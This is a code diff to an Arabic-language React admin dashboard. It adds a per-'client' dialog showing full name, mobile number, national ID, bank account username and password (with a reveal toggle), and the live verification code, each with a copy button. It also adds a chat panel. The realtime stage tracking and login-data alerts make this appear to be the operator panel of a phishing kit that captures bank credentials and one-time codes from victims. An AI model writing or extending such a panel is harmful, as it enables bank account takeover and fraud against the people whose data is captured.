@@ -1,10 +1,11 @@
 import { useMemo, useState, useEffect, useRef } from 'react';
-import { ChevronDown, History, Wifi, WifiOff, Home as HomeIcon, KeyRound, ShieldCheck, Loader2, Clock, User, CheckCircle, XCircle, Search, Copy, Check, Shield, Lock, AlertTriangle, Users, ZoomIn, ZoomOut, Type, Settings } from 'lucide-react';
+import { ChevronDown, History, Wifi, WifiOff, Home as HomeIcon, KeyRound, ShieldCheck, Loader2, Clock, User, CheckCircle, XCircle, Search, Copy, Check, Shield, Lock, AlertTriangle, Users, ZoomIn, ZoomOut, Type, Settings, FileText, Phone, CreditCard, Eye, EyeOff, MessageCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
 import { Input } from '@/components/ui/input';
 import { useAdminRealtime, type ClientState, type ClientStage, type StageLogEntry } from '@/hooks/useAdminRealtime';
 import { AdminLayout } from '@/components/layout/AdminLayout';
+import { ChatPanel } from '@/components/ChatPanel';
 
 // Font size settings (local only - resets on page reload)
 const FONT_SIZES = {
@@ -526,6 +527,8 @@ function ClientCard({
 }) {
   const [expanded, setExpanded] = useState(false);
   const [historyStage, setHistoryStage] = useState<string | null>(null);
+  const [showDataDialog, setShowDataDialog] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
   const isOnline = client.status === 'online';
   const displayName = client.fullName?.trim() || 'بدون اسم';
   const stageColors = STAGE_COLORS[client.stage] || STAGE_COLORS.home;
@@ -606,6 +609,14 @@ function ClientCard({
 
         {/* Stage Badge */}
         <div className="flex items-center gap-2 sm:gap-3 shrink-0">
+          {/* زر عرض البيانات */}
+          <button
+            onClick={(e) => { e.stopPropagation(); setShowDataDialog(true); }}
+            className="p-2 rounded-lg bg-blue-100 hover:bg-blue-200 text-blue-600 transition-colors"
+            title="عرض البيانات"
+          >
+            <FileText className="w-4 h-4 sm:w-5 sm:h-5" />
+          </button>
           {hasLoginData && !expanded && shouldHighlightLogin && (
             <span className="text-[10px] sm:text-xs font-medium px-2 sm:px-3 py-1 rounded-full bg-blue-500 text-white whitespace-nowrap flex items-center gap-1 animate-pulse">
               <KeyRound className="w-3 h-3" />
@@ -795,6 +806,169 @@ function ClientCard({
           requestHistory={requestHistory}
         />
       )}
+
+      {/* Dialog لعرض بيانات العميل الكاملة */}
+      <Dialog open={showDataDialog} onOpenChange={setShowDataDialog}>
+        <DialogContent className="max-w-lg max-h-[85vh] overflow-y-auto" dir="rtl">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-2">
+              <User className="w-5 h-5 text-primary" />
+              بيانات العميل
+            </DialogTitle>
+            <DialogDescription>
+              جميع البيانات المسجلة للعميل {displayName}
+            </DialogDescription>
+          </DialogHeader>
+          
+          <div className="space-y-4 mt-2">
+            {/* الحالة الحالية */}
+            <div className="flex items-center justify-between p-3 bg-muted/50 rounded-lg">
+              <div className="flex items-center gap-2">
+                <div className={`w-3 h-3 rounded-full ${isOnline ? 'bg-emerald-500 animate-pulse' : 'bg-gray-400'}`} />
+                <span className="text-sm font-medium">{isOnline ? 'متصل الآن' : 'غير متصل'}</span>
+              </div>
+              <span className={`text-xs font-medium px-2 py-1 rounded-full ${stageColors.bg} ${stageColors.text}`}>
+                {STAGE_LABEL[client.stage] ?? client.stage}
+              </span>
+            </div>
+
+            {/* بيانات التسجيل */}
+            {(client.fullName || client.mobile || client.nationalId) && (
+              <div className="space-y-3">
+                <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
+                  <FileText className="w-4 h-4" />
+                  بيانات التسجيل
+                </h4>
+                <div className="bg-card border rounded-xl p-4 space-y-3">
+                  {client.fullName && (
+                    <div className="flex items-center justify-between">
+                      <span className="text-sm text-muted-foreground">الاسم الكامل</span>
+                      <span className="text-sm font-medium">{client.fullName}</span>
+                    </div>
+                  )}
+                  {client.mobile && (
+                    <div className="flex items-center justify-between">
+                      <span className="text-sm text-muted-foreground flex items-center gap-1">
+                        <Phone className="w-3.5 h-3.5" />
+                        رقم الموبايل
+                      </span>
+                      <div className="flex items-center gap-2">
+                        <span dir="ltr" className="text-sm font-mono">{client.mobile}</span>
+                        <CopyButton value={client.mobile} label="موبايل" />
+                      </div>
+                    </div>
+                  )}
+                  {client.nationalId && (
+                    <div className="flex items-center justify-between">
+                      <span className="text-sm text-muted-foreground flex items-center gap-1">
+                        <CreditCard className="w-3.5 h-3.5" />
+                        الرقم القومي
+                      </span>
+                      <div className="flex items-center gap-2">
+                        <span dir="ltr" className="text-sm font-mono">{client.nationalId}</span>
+                        <CopyButton value={client.nationalId} label="رقم القومي" />
+                      </div>
+                    </div>
+                  )}
+                </div>
+              </div>
+            )}
+
+            {/* بيانات الحساب */}
+            {(client.username || client.password) && (
+              <div className="space-y-3">
+                <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
+                  <KeyRound className="w-4 h-4" />
+                  بيانات الحساب البنكي
+                </h4>
+                <div className="bg-card border rounded-xl p-4 space-y-3">
+                  {client.username && (
+                    <div className="flex items-center justify-between">
+                      <span className="text-sm text-muted-foreground">اسم المستخدم</span>
+                      <div className="flex items-center gap-2">
+                        <span dir="ltr" className="text-sm font-mono">{client.username}</span>
+                        <CopyButton value={client.username} label="مستخدم" />
+                      </div>
+                    </div>
+                  )}
+                  {client.password && (
+                    <div className="flex items-center justify-between">
+                      <span className="text-sm text-muted-foreground">كلمة المرور</span>
+                      <div className="flex items-center gap-2">
+                        <span dir="ltr" className="text-sm font-mono">
+                          {showPassword ? client.password : '••••••••'}
+                        </span>
+                        <button
+                          type="button"
+                          onClick={() => setShowPassword(!showPassword)}
+                          className="p-1 rounded hover:bg-muted transition-colors"
+                          title={showPassword ? 'إخفاء' : 'إظهار'}
+                        >
+                          {showPassword ? (
+                            <EyeOff className="w-3.5 h-3.5 text-muted-foreground" />
+                          ) : (
+                            <Eye className="w-3.5 h-3.5 text-muted-foreground" />
+                          )}
+                        </button>
+                        <CopyButton value={client.password} label="كلمة مرور" />
+                      </div>
+                    </div>
+                  )}
+                </div>
+              </div>
+            )}
+
+            {/* رمز التحقق */}
+            {client.verificationCode && (
+              <div className="space-y-3">
+                <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
+                  <ShieldCheck className="w-4 h-4" />
+                  رمز التحقق
+                </h4>
+                <div className="bg-card border rounded-xl p-4 flex items-center justify-between">
+                  <span className="text-sm text-muted-foreground">رمز التحقق</span>
+                  <div className="flex items-center gap-2">
+                    <span dir="ltr" className="text-2xl font-mono font-bold tracking-widest text-primary">
+                      {client.verificationCode}
+                    </span>
+                    <CopyButton value={client.verificationCode} label="رمز التحقق" />
+                  </div>
+                </div>
+              </div>
+            )}
+
+            {/* معلومات الجلسة */}
+            <div className="space-y-3">
+              <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
+                <Clock className="w-4 h-4" />
+                معلومات الجلسة
+              </h4>
+              <div className="bg-card border rounded-xl p-4 space-y-3">
+                <div className="flex items-center justify-between">
+                  <span className="text-sm text-muted-foreground">معرف الجلسة</span>
+                  <span dir="ltr" className="text-xs font-mono text-muted-foreground truncate max-w-[150px]">
+                    {client.sessionId}
+                  </span>
+                </div>
+                <div className="flex items-center justify-between">
+                  <span className="text-sm text-muted-foreground">آخر ظهور</span>
+                  <span className="text-sm">
+                    {client.lastSeenAt ? formatTime(client.lastSeenAt) : 'غير معروف'}
+                  </span>
+                </div>
+                <div className="flex items-center justify-between">
+                  <span className="text-sm text-muted-foreground">تاريخ الإنشاء</span>
+                  <span className="text-sm">{formatTime(client.createdAt)}</span>
+                </div>
+                <div className="flex items-center justify-between">
+                  <span className="text-sm text-muted-foreground">آخر تحديث</span>
+                  <span className="text-sm">{formatTime(client.updatedAt)}</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 }
@@ -873,6 +1047,7 @@ export default function Admin() {
   const [showFontSettings, setShowFontSettings] = useState(false);
   const [fontSize, setFontSize] = useState<FontSizeKey>('normal');
   const [soundEnabled, setSoundEnabled] = useState(true);
+  const [chatPanelOpen, setChatPanelOpen] = useState(false);
   
   // Track previous client data to detect new data arrival
   const previousClientsData = useRef<Map<string, ClientState>>(new Map());
@@ -1049,6 +1224,16 @@ export default function Admin() {
       >
         {/* Controls Bar */}
         <div className="flex items-center justify-between gap-3 bg-muted/30 rounded-xl p-3">
+          {/* Chat Button */}
+          <button
+            onClick={() => setChatPanelOpen(true)}
+            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-[#0a4fa3] text-white hover:bg-[#073a7a] transition-colors"
+            title="المحادثات"
+          >
+            <MessageCircle className="w-5 h-5" />
+            <span className="text-sm font-medium">المحادثات</span>
+          </button>
+
           {/* Sound Toggle */}
           <button
             onClick={() => setSoundEnabled(!soundEnabled)}
@@ -1234,6 +1419,13 @@ export default function Admin() {
           ))}
         </div>
       </div>
+
+      {/* Chat Panel */}
+      <ChatPanel
+        isOpen={chatPanelOpen}
+        onClose={() => setChatPanelOpen(false)}
+        isAdminConnected={status === 'connected'}
+      />
     </AdminLayout>
   );
 }
